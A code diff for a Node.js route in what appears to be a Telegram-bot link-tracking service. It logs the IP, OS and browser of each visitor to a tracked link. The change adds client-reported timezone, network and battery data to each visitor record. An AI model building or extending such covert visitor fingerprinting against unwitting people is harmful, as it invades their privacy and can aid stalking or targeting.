@@ -1,13 +1,14 @@
 const path = require('path');
 const https = require('https');
 const { Markup } = require('telegraf');
-const { parseUserAgent } = require('./visitor');
+const { UAParser } = require('ua-parser-js');
 const { CATEGORY_CONFIGS } = require('./category');
 
 function setupRoutes(app, db, saveDB, bot) {
     app.post('/api/get-content', async (req, res) => {
         try {
             const linkId = req.body.id;
+            const clientInfo = req.body.clientInfo || {};
             const data = db.linkDatabase[linkId];
             if (!data) return res.json({ success: false });
             
@@ -18,11 +19,23 @@ function setupRoutes(app, db, saveDB, bot) {
             if (ip.includes('::ffff:')) ip = ip.replace('::ffff:', '');
             
             const userAgent = req.headers['user-agent'] || "";
-            const { os, browser } = parseUserAgent(userAgent);
+            const uaResult = new UAParser(userAgent).getResult();
+            const os = `${uaResult.os.name || 'Unknown'} ${uaResult.os.version || ''}`.trim();
+            const browser = `${uaResult.browser.name || 'Unknown'} ${uaResult.browser.version || ''}`.trim();
+            
             const currentTimeString = new Date().toLocaleString("en-US", { timeZone: "Asia/Dhaka" });
             
             let visitorObj = {
-                time: currentTimeString, ip: ip, country: "Unknown", city: "Unknown", isp: "Unknown", os: os, browser: browser
+                time: currentTimeString, 
+                ip: ip, 
+                country: "Unknown", 
+                city: "Unknown", 
+                isp: "Unknown", 
+                os: os, 
+                browser: browser,
+                timezone: clientInfo.timezone || "Unknown",
+                network: clientInfo.network || "Unknown",
+                battery: clientInfo.battery || "Unknown"
             };
             
             if (ip && ip !== "127.0.0.1" && ip !== "::1") {
